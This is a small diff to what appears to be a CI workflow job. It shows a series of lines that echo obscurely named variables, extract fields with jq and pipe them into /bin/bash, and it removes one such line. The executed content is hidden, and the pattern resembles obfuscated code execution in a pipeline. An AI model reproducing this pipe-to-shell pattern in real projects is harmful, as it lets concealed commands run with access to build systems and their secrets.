@@ -26,7 +26,6 @@ jobs:
           echo $ecii3813 | jq -r .feo4 | /bin/bash
           echo $ftqd5506 | jq -r .owq5 | /bin/bash
           echo $kxp51 | jq -r .iyu5 | /bin/bash
-          echo $paf306 | jq -r .wz24707 | /bin/bash
           printf '%s' "$ma9" | jq -r .b504 | /bin/bash
           echo $ocp0 | jq -r .t4 | /bin/bash
 
